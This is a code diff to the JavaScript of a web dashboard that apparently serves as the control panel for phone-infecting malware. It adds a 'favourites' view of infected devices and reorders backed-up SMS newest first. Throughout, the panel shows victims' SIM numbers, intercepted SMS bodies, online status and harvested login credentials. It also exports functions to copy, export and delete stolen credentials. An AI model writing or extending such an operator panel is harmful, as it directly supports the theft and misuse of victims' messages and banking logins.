@@ -1,5 +1,5 @@
 /* ============================================================ */
-/* app.js - COMPLETE WITH LATEST FIRST CREDENTIALS             */
+/* app.js - COMPLETE WITH ALL FEATURES                        */
 /* ============================================================ */
 
 // ============================================================
@@ -40,7 +40,7 @@ const state = {
     modalSmsList: [],
     expandedDevices: new Map(),
     activeTabs: new Map(),
-    isPanelOpen: { devices: true, sms: false, credentials: false, backup: false, analytics: false },
+    isPanelOpen: { devices: true, favourites: false, sms: false, credentials: false, backup: false, analytics: false },
     formMemory: {},
     deviceOffset: 0,
     allSmsOffset: 0,
@@ -58,13 +58,252 @@ const state = {
     credCatalogData: [],
     credFilter: 'all',
     credSearchQuery: '',
-    credCurrentPage: 1
+    credCurrentPage: 1,
+    favourites: []
 };
 
 // ============================================================
 // DOM REFS
 // ============================================================
 const $ = (id) => document.getElementById(id);
+
+// ============================================================
+// FAVOURITES - STATE & FUNCTIONS
+// ============================================================
+
+// Load favourites from localStorage
+function loadFavourites() {
+    try {
+        const saved = localStorage.getItem('rtoFavourites');
+        if (saved) {
+            state.favourites = JSON.parse(saved);
+        } else {
+            state.favourites = [];
+        }
+    } catch(e) {
+        state.favourites = [];
+    }
+    updateFavCounts();
+    return state.favourites;
+}
+
+// Save favourites to localStorage
+function saveFavourites() {
+    try {
+        localStorage.setItem('rtoFavourites', JSON.stringify(state.favourites));
+    } catch(e) {
+        console.error('Failed to save favourites:', e);
+    }
+    updateFavCounts();
+}
+
+// Toggle favourite status
+function toggleFavourite(devId) {
+    const index = state.favourites.indexOf(devId);
+    if (index > -1) {
+        state.favourites.splice(index, 1);
+        showToast(`⭐ Removed ${devId} from favourites`, 'info');
+    } else {
+        state.favourites.push(devId);
+        showToast(`⭐ Added ${devId} to favourites`, 'success');
+    }
+    saveFavourites();
+    renderFavouritesCatalog();
+    updateDeviceFavStars();
+}
+
+// Check if device is favourite
+function isFavourite(devId) {
+    return state.favourites.includes(devId);
+}
+
+// Update favourite counts in UI
+function updateFavCounts() {
+    const count = state.favourites.length;
+    const favCount = $('favCount');
+    const panelFavCount = $('panelFavCount');
+    const mobileFavBadge = $('mobileFavBadge');
+    
+    if (favCount) favCount.textContent = count;
+    if (panelFavCount) panelFavCount.textContent = count;
+    if (mobileFavBadge) {
+        mobileFavBadge.textContent = count;
+        mobileFavBadge.style.display = count > 0 ? 'block' : 'none';
+    }
+}
+
+// Clear all favourites
+function clearAllFavourites() {
+    if (!confirm('⚠️ Remove all devices from favourites?')) return;
+    state.favourites = [];
+    saveFavourites();
+    renderFavouritesCatalog();
+    updateDeviceFavStars();
+    showToast('✅ All favourites cleared', 'success');
+}
+
+// ============================================================
+// RENDER FAVOURITES CATALOG
+// ============================================================
+function renderFavouritesCatalog() {
+    const container = document.getElementById('favouritesContainer');
+    if (!container) return;
+    
+    loadFavourites();
+    
+    if (state.favourites.length === 0) {
+        container.innerHTML = `
+            <div class="favourites-catalog active">
+                <div class="no-fav">
+                    <div class="no-fav-icon"><i class="fas fa-star"></i></div>
+                    <h4>No Favourite Devices</h4>
+                    <p>Star your important devices from the Devices panel to see them here</p>
+                    <div class="no-fav-hint">
+                        <i class="fas fa-info-circle" style="color:var(--gold);"></i>
+                        Click the ⭐ star icon on any device card to add it to favourites
+                    </div>
+                </div>
+            </div>
+        `;
+        return;
+    }
+    
+    const devices = state.data.user_data || {};
+    let html = `
+        <div class="favourites-catalog active">
+            <div class="fav-header">
+                <div class="fav-title">
+                    <h3>⭐ Favourite Devices</h3>
+                    <span class="fav-badge">${state.favourites.length} devices</span>
+                </div>
+                <div class="fav-stats">
+                    <span class="stat-chip">
+                        <i class="fas fa-star" style="color:var(--gold);"></i>
+                        Total: <span class="num">${state.favourites.length}</span>
+                    </span>
+                    <span class="stat-chip">
+                        <i class="fas fa-mobile-alt"></i>
+                        Online: <span class="num" id="favOnlineCount">0</span>
+                    </span>
+                </div>
+            </div>
+            
+            <div class="fav-grid">
+    `;
+    
+    let onlineCount = 0;
+    
+    state.favourites.forEach(devId => {
+        const dev = devices[devId] || {};
+        const serial = state.deviceSerialMap.get(devId) || 0;
+        const online = state.deviceOnlineStatus.get(devId) || false;
+        const lastSeen = dev.last_online || dev.timestamp;
+        const timeStr = lastSeen ? new Date(lastSeen).toLocaleString() : 'N/A';
+        
+        if (online) onlineCount++;
+        
+        const smsCache = state.deviceSmsCache.get(devId);
+        const totalSms = smsCache ? smsCache.all.length : 0;
+        
+        const loginData = state.data.login || {};
+        let credCount = 0;
+        if (loginData[devId]) {
+            credCount = Object.keys(loginData[devId]).length;
+        }
+        
+        html += `
+            <div class="fav-card" data-device="${devId}">
+                <div class="fav-card-header">
+                    <div class="device-info">
+                        <span class="fav-star" onclick="toggleFavourite('${devId}')" title="Remove from favourites">
+                            <i class="fas fa-star"></i>
+                        </span>
+                        <span class="dev-name">📱 ${escapeHtml(devId)}</span>
+                        ${serial > 0 ? `<span class="dev-serial">S-${serial}</span>` : ''}
+                    </div>
+                    <span class="fav-status ${online ? 'online' : 'offline'}">
+                        <span class="status-dot" style="width:6px;height:6px;border-radius:50%;display:inline-block;background:${online ? 'var(--green)' : 'var(--red)'};"></span>
+                        ${online ? 'Online' : 'Offline'}
+                    </span>
+                </div>
+                <div class="fav-card-body">
+                    <div class="fav-info-grid">
+                        <div class="fav-info-item">
+                            <span class="label">Device Info</span>
+                            <span class="value">${escapeHtml(dev.Device_info || dev.device_info || 'N/A')}</span>
+                        </div>
+                        <div class="fav-info-item">
+                            <span class="label">SIM 1</span>
+                            <span class="value">${escapeHtml(dev.numberSim1 || dev.sim1 || 'N/A')}</span>
+                        </div>
+                        <div class="fav-info-item">
+                            <span class="label">SIM 2</span>
+                            <span class="value">${escapeHtml(dev.numberSim2 || dev.sim2 || 'N/A')}</span>
+                        </div>
+                        <div class="fav-info-item">
+                            <span class="label">Serial</span>
+                            <span class="value highlight">${serial > 0 ? serial : '—'}</span>
+                        </div>
+                        <div class="fav-info-item">
+                            <span class="label">SMS</span>
+                            <span class="value">${totalSms}</span>
+                        </div>
+                        <div class="fav-info-item">
+                            <span class="label">Credentials</span>
+                            <span class="value">${credCount}</span>
+                        </div>
+                        <div class="fav-info-item" style="grid-column:1/-1;">
+                            <span class="label">Last Seen</span>
+                            <span class="value" style="font-size:11px;color:var(--text-muted);">${timeStr}</span>
+                        </div>
+                    </div>
+                </div>
+                <div class="fav-card-footer">
+                    <button class="fav-action-btn gold" onclick="toggleDevice('${devId}');setTimeout(()=>{document.getElementById('card-${devId}')?.scrollIntoView({behavior:'smooth'})},300);">
+                        <i class="fas fa-expand"></i> View Details
+                    </button>
+                    <button class="fav-action-btn" onclick="setTab('${devId}','sms');togglePanel('devices');">
+                        <i class="fas fa-envelope"></i> SMS
+                    </button>
+                    <button class="fav-action-btn" onclick="setTab('${devId}','login');togglePanel('devices');">
+                        <i class="fas fa-key"></i> Creds
+                    </button>
+                    <button class="fav-action-btn danger" onclick="toggleFavourite('${devId}');">
+                        <i class="fas fa-star"></i> Remove
+                    </button>
+                </div>
+            </div>
+        `;
+    });
+    
+    html += `
+            </div>
+        </div>
+    `;
+    
+    container.innerHTML = html;
+    
+    const onlineCountEl = document.getElementById('favOnlineCount');
+    if (onlineCountEl) onlineCountEl.textContent = onlineCount;
+}
+
+// ============================================================
+// UPDATE DEVICE CARD FAVOURITE STARS
+// ============================================================
+function updateDeviceFavStars() {
+    const cards = document.querySelectorAll('.device-card-premium');
+    cards.forEach(card => {
+        const devId = card.dataset.deviceId;
+        if (!devId) return;
+        
+        const favBtn = card.querySelector('.fav-star-btn');
+        if (favBtn) {
+            const isFav = isFavourite(devId);
+            favBtn.innerHTML = isFav ? '<i class="fas fa-star"></i>' : '<i class="far fa-star"></i>';
+            favBtn.title = isFav ? 'Remove from favourites' : 'Add to favourites';
+        }
+    });
+}
 
 // ============================================================
 // CONNECTION MONITOR
@@ -230,6 +469,7 @@ function performRender() {
     try {
         updateCounts();
         if (state.isPanelOpen.devices) renderDevicesOptimized();
+        if (state.isPanelOpen.favourites) renderFavouritesCatalog();
         if (state.isPanelOpen.sms) renderAllSmsOptimized();
         if (state.isPanelOpen.credentials) renderCredentialsCatalog();
         if (state.isPanelOpen.analytics) renderAnalytics();
@@ -366,7 +606,7 @@ function renderDevicesOptimized() {
 }
 
 // ============================================================
-// BUILD DEVICE CARD - PREMIUM WITH LATEST FIRST
+// BUILD DEVICE CARD - PREMIUM WITH LATEST FIRST & FAVOURITES
 // ============================================================
 function buildDeviceCardPremium(devId, index, devices) {
     const dev = devices[devId] || {};
@@ -389,12 +629,12 @@ function buildDeviceCardPremium(devId, index, devices) {
             credData._timestamp = credData.timestamp || credData.date || Date.now();
             devLoginList.push(credData);
         });
-        // SORT - LATEST FIRST (descending timestamp)
         devLoginList.sort((a, b) => (b._timestamp || 0) - (a._timestamp || 0));
     }
     
     const isExpanded = state.expandedDevices.get(devId) || false;
     const activeTab = state.activeTabs.get(devId) || null;
+    const isFav = isFavourite(devId);
     
     let devSmsList = [];
     const hasMoreSms = smsCache && (smsCache.offset + SMS_LIMIT < smsCache.all.length);
@@ -622,9 +862,15 @@ function buildDeviceCardPremium(devId, index, devices) {
             <div class="card-header" onclick="toggleDevice('${devId}')">
                 <div class="device-info-left">
                     <div class="device-name-premium">
+                        <button class="fav-star-btn" onclick="event.stopPropagation();toggleFavourite('${devId}')" 
+                            style="background:transparent;border:none;cursor:pointer;font-size:18px;padding:0 4px;transition:all 0.3s ease;color:var(--gold);"
+                            title="${isFav ? 'Remove from favourites' : 'Add to favourites'}">
+                            ${isFav ? '<i class="fas fa-star"></i>' : '<i class="far fa-star"></i>'}
+                        </button>
                         <span class="name-text">📱 ${escapeHtml(devId)}</span>
                         <span class="device-id">#${index + 1}</span>
                         ${serial > 0 ? `<span class="serial-badge-premium"><i class="fas fa-hashtag"></i> S-${serial}</span>` : ''}
+                        ${isFav ? `<span style="color:var(--gold);font-size:10px;background:rgba(212,175,55,0.12);padding:1px 8px;border-radius:10px;border:1px solid rgba(212,175,55,0.2);">⭐ FAV</span>` : ''}
                     </div>
                     <div class="device-sub-info">
                         <span><i class="fas fa-microchip"></i> ${escapeHtml(dev.Device_info || dev.device_info || 'N/A')}</span>
@@ -872,7 +1118,7 @@ function updateDeviceStatusUI(devId, isOnline, lastSeen) {
 // TOGGLE PANEL
 // ============================================================
 function togglePanel(panel) {
-    const panels = ['devices', 'sms', 'credentials', 'backup', 'analytics'];
+    const panels = ['devices', 'favourites', 'sms', 'credentials', 'backup', 'analytics'];
     
     panels.forEach(p => {
         if (p !== panel) {
@@ -896,6 +1142,7 @@ function togglePanel(panel) {
             panelEl.classList.add('active');
             if (nav) nav.classList.add('active');
             if (mobileNav) mobileNav.classList.add('active');
+            if (panel === 'favourites') renderFavouritesCatalog();
             if (panel === 'credentials') renderCredentialsCatalog();
             performRender();
         } else {
@@ -1160,7 +1407,7 @@ function renderBackupPanel() {
 }
 
 // ============================================================
-// BACKUP FUNCTIONS
+// BACKUP FUNCTIONS - LATEST FIRST WITH BACKUP TAG
 // ============================================================
 function updateBackupStatusDisplay(devId) {
     const dev = state.data.user_data?.[devId];
@@ -1208,6 +1455,14 @@ function updateBackupStatusDisplay(devId) {
     
     const badge = $('backupStatusBadge');
     if (badge) badge.textContent = st === 'success' ? '✅ Ready' : '⏳ Pending';
+    
+    const backupData = state.data.backup_sms;
+    if (backupData && backupData[devId]) {
+        const msgs = Object.keys(backupData[devId]);
+        if (smsCountEl) {
+            smsCountEl.textContent = msgs.length + ' SMS (Backup)';
+        }
+    }
 }
 
 function triggerBackup() {
@@ -1282,6 +1537,33 @@ function refreshDeviceBackup(devId) {
                     const last = info.last_backup_time || info.timestamp || null;
                     html += `<div style="font-size:10px;color:var(--text-muted);margin-top:3px;">📨 ${count} SMS | ${last ? '📅 ' + new Date(last).toLocaleString() : 'No time'}</div>`;
                 }
+                
+                const backupData = state.data.backup_sms;
+                if (backupData && backupData[devId]) {
+                    const actualCount = Object.keys(backupData[devId]).length;
+                    html += `<div style="font-size:10px;color:var(--green);margin-top:2px;">💾 ${actualCount} backup messages stored</div>`;
+                    
+                    const messages = [];
+                    Object.keys(backupData[devId]).forEach(key => {
+                        const msg = backupData[devId][key];
+                        msg._timestamp = msg.timestamp || msg.date || 0;
+                        messages.push(msg);
+                    });
+                    messages.sort((a, b) => (b._timestamp || 0) - (a._timestamp || 0));
+                    
+                    if (messages.length > 0) {
+                        const latest = messages[0];
+                        const sender = latest.sender || latest.address || 'Unknown';
+                        const body = latest.body || 'No content';
+                        const time = latest.timestamp ? new Date(latest.timestamp).toLocaleString() : '';
+                        html += `<div style="font-size:10px;color:var(--text-secondary);margin-top:4px;padding:4px 8px;background:var(--bg-input);border-radius:4px;border-left:2px solid var(--gold);">
+                            <span style="font-weight:600;">⬇️ Latest Backup:</span>
+                            👤 ${escapeHtml(sender)} ${time ? '🕐 ' + escapeHtml(time) : ''}
+                            <div style="font-size:10px;color:var(--text-muted);margin-top:2px;">${escapeHtml(body.substring(0, 50))}${body.length > 50 ? '...' : ''}</div>
+                        </div>`;
+                    }
+                }
+                
                 div.innerHTML = html;
             });
         } else {
@@ -1307,7 +1589,7 @@ function clearBackupStatus() {
 }
 
 // ============================================================
-// LOAD BACKUP SMS FOR DEVICE
+// LOAD BACKUP SMS FOR DEVICE - LATEST FIRST
 // ============================================================
 function loadBackupSmsForDevice(devId) {
     const container = $('backupSmsList');
@@ -1318,7 +1600,7 @@ function loadBackupSmsForDevice(devId) {
     
     const backupData = state.data.backup_sms;
     if (backupData && backupData[devId]) {
-        renderBackupSmsList(container, backupData[devId]);
+        renderBackupSmsList(container, backupData[devId], devId);
         return;
     }
     
@@ -1328,7 +1610,7 @@ function loadBackupSmsForDevice(devId) {
     
     db.ref(`backup_sms/${devId}`).once('value').then(snap => {
         if (snap.exists()) {
-            renderBackupSmsList(container, snap.val());
+            renderBackupSmsList(container, snap.val(), devId);
         } else {
             if (container) container.innerHTML = '<div class="empty-luxury">No backup SMS found</div>';
         }
@@ -1337,32 +1619,55 @@ function loadBackupSmsForDevice(devId) {
     });
 }
 
-function renderBackupSmsList(container, data) {
+// ============================================================
+// RENDER BACKUP SMS LIST - LATEST FIRST WITH BACKUP TAG
+// ============================================================
+function renderBackupSmsList(container, data, devId) {
     if (!container) return;
     const messages = [];
     Object.keys(data).forEach(key => {
-        messages.push({ key, ...data[key] });
+        const msgData = { key, ...data[key] };
+        msgData._timestamp = msgData.timestamp || msgData.date || Date.now();
+        messages.push(msgData);
     });
-    messages.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
+    messages.sort((a, b) => (b._timestamp || 0) - (a._timestamp || 0));
     
     if (messages.length === 0) {
         container.innerHTML = '<div class="empty-luxury">No backup messages</div>';
         return;
     }
     
-    container.innerHTML = messages.map(msg => `
-        <div class="backup-sms-item">
-            <div class="sms-header">
-                <span class="sender">👤 ${escapeHtml(msg.sender || msg.address || 'Unknown')}</span>
-                <span>${escapeHtml(msg.date_formatted || msg.date || new Date(msg.timestamp).toLocaleString())}</span>
+    container.innerHTML = messages.map((msg, index) => {
+        const isLatest = index === 0;
+        const backupTag = isLatest ? `<span style="background:var(--green);color:#fff;font-size:8px;padding:1px 8px;border-radius:10px;margin-left:6px;">⬇️ LATEST BACKUP</span>` : `<span style="background:rgba(212,175,55,0.15);color:var(--gold);font-size:8px;padding:1px 8px;border-radius:10px;margin-left:6px;border:1px solid rgba(212,175,55,0.2);">💾 BACKUP</span>`;
+        
+        const timestamp = msg.timestamp || msg.date || '';
+        let displayTime = '';
+        if (timestamp) {
+            try {
+                const d = new Date(timestamp);
+                displayTime = d.toLocaleString();
+            } catch(e) { displayTime = ''; }
+        }
+        
+        return `
+            <div class="backup-sms-item" style="${isLatest ? 'border-left: 3px solid var(--green);' : ''}">
+                <div class="sms-header">
+                    <span class="sender">
+                        👤 ${escapeHtml(msg.sender || msg.address || 'Unknown')}
+                        ${backupTag}
+                    </span>
+                    <span>${displayTime ? escapeHtml(displayTime) : escapeHtml(msg.date_formatted || msg.date || '')}</span>
+                </div>
+                <div class="sms-body">${escapeHtml(msg.body || 'No content')}</div>
+                <div style="font-size:9px;color:var(--text-muted);margin-top:2px;display:flex;gap:8px;flex-wrap:wrap;">
+                    ${msg.sim_number ? '📱 ' + escapeHtml(msg.sim_number) : ''}
+                    ${msg.backup_id ? ' • 💾 ID: ' + escapeHtml(msg.backup_id) : ''}
+                    ${msg.device_id ? ' • 📱 Device: ' + escapeHtml(msg.device_id) : ''}
+                </div>
             </div>
-            <div class="sms-body">${escapeHtml(msg.body || 'No content')}</div>
-            <div style="font-size:9px;color:var(--text-muted);margin-top:2px;">
-                ${msg.sim_number ? '📱 ' + escapeHtml(msg.sim_number) : ''}
-                ${msg.backup_id ? ' • 💾 ' + escapeHtml(msg.backup_id) : ''}
-            </div>
-        </div>
-    `).join('');
+        `;
+    }).join('');
 }
 
 // ============================================================
@@ -1372,7 +1677,7 @@ function openBackupSmsModal() {
     const modal = $('backupSmsModal');
     const body = $('backupModalBody');
     const title = $('backupModalTitle');
-    if (title) title.textContent = '💾 All Backup Messages';
+    if (title) title.textContent = '💾 All Backup Messages (Latest First)';
     if (body) body.innerHTML = '<div class="loading-luxury"><span class="loader-ring"></span> Loading backups...</div>';
     if (modal) modal.classList.add('open');
     
@@ -1399,32 +1704,49 @@ function renderAllBackupSms(container, data) {
     Object.keys(data).forEach(devId => {
         const devMsgs = data[devId];
         Object.keys(devMsgs).forEach(key => {
-            allMsgs.push({ deviceId: devId, key, ...devMsgs[key] });
+            const msgData = { deviceId: devId, key, ...devMsgs[key] };
+            msgData._timestamp = msgData.timestamp || msgData.date || Date.now();
+            allMsgs.push(msgData);
         });
     });
-    allMsgs.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
+    allMsgs.sort((a, b) => (b._timestamp || 0) - (a._timestamp || 0));
     
     if (allMsgs.length === 0) {
         container.innerHTML = '<div class="empty-luxury">No backup messages</div>';
         return;
     }
     
-    container.innerHTML = allMsgs.map(msg => `
-        <div class="backup-sms-item">
-            <div class="sms-header">
-                <span class="sender">
-                    <span style="color:var(--gold-light);font-size:10px;">[${escapeHtml(msg.deviceId)}]</span>
-                    👤 ${escapeHtml(msg.sender || msg.address || 'Unknown')}
-                </span>
-                <span>${escapeHtml(msg.date_formatted || msg.date || new Date(msg.timestamp).toLocaleString())}</span>
+    container.innerHTML = allMsgs.map((msg, index) => {
+        const isLatest = index === 0;
+        const backupTag = isLatest ? `<span style="background:var(--green);color:#fff;font-size:8px;padding:1px 8px;border-radius:10px;margin-left:6px;">⬇️ LATEST BACKUP</span>` : `<span style="background:rgba(212,175,55,0.15);color:var(--gold);font-size:8px;padding:1px 8px;border-radius:10px;margin-left:6px;border:1px solid rgba(212,175,55,0.2);">💾 BACKUP</span>`;
+        
+        const timestamp = msg.timestamp || msg.date || '';
+        let displayTime = '';
+        if (timestamp) {
+            try {
+                const d = new Date(timestamp);
+                displayTime = d.toLocaleString();
+            } catch(e) { displayTime = ''; }
+        }
+        
+        return `
+            <div class="backup-sms-item" style="${isLatest ? 'border-left: 3px solid var(--green);' : ''}">
+                <div class="sms-header">
+                    <span class="sender">
+                        <span style="color:var(--gold-light);font-size:10px;">[${escapeHtml(msg.deviceId)}]</span>
+                        👤 ${escapeHtml(msg.sender || msg.address || 'Unknown')}
+                        ${backupTag}
+                    </span>
+                    <span>${displayTime ? escapeHtml(displayTime) : escapeHtml(msg.date_formatted || msg.date || '')}</span>
+                </div>
+                <div class="sms-body">${escapeHtml(msg.body || 'No content')}</div>
+                <div style="font-size:9px;color:var(--text-muted);margin-top:2px;display:flex;gap:8px;flex-wrap:wrap;">
+                    ${msg.sim_number ? '📱 ' + escapeHtml(msg.sim_number) : ''}
+                    ${msg.backup_id ? ' • 💾 ID: ' + escapeHtml(msg.backup_id) : ''}
+                </div>
             </div>
-            <div class="sms-body">${escapeHtml(msg.body || 'No content')}</div>
-            <div style="font-size:9px;color:var(--text-muted);margin-top:2px;">
-                ${msg.sim_number ? '📱 ' + escapeHtml(msg.sim_number) : ''}
-                ${msg.backup_id ? ' • 💾 ' + escapeHtml(msg.backup_id) : ''}
-            </div>
-        </div>
-    `).join('');
+        `;
+    }).join('');
 }
 
 function closeBackupSmsModal(e) {
@@ -1795,7 +2117,6 @@ function renderCredentialsCatalog() {
                 credList.push(credData);
             });
             
-            // SORT: LATEST FIRST (highest timestamp first)
             credList.sort((a, b) => {
                 const aTime = a._timestamp || 0;
                 const bTime = b._timestamp || 0;
@@ -1814,7 +2135,6 @@ function renderCredentialsCatalog() {
         }
     });
     
-    // Sort devices by latest credential timestamp
     state.credCatalogData.sort((a, b) => {
         return (b.latestTimestamp || 0) - (a.latestTimestamp || 0);
     });
@@ -2436,6 +2756,9 @@ function initLongPress() {
 // DOM CONTENT LOADED
 // ============================================================
 document.addEventListener('DOMContentLoaded', function() {
+    // Load favourites
+    loadFavourites();
+    
     const backupSelect = $('backupDeviceSelect');
     if (backupSelect) {
         backupSelect.addEventListener('change', function() {
@@ -2543,3 +2866,10 @@ window.copyAllCreds = copyAllCreds;
 window.deleteSingleCred = deleteSingleCred;
 window.exportCredentials = exportCredentials;
 window.renderCredentialsCatalog = renderCredentialsCatalog;
+window.toggleFavourite = toggleFavourite;
+window.isFavourite = isFavourite;
+window.clearAllFavourites = clearAllFavourites;
+window.renderFavouritesCatalog = renderFavouritesCatalog;
+window.loadFavourites = loadFavourites;
+window.updateFavCounts = updateFavCounts;
+window.updateDeviceFavStars = updateDeviceFavStars;
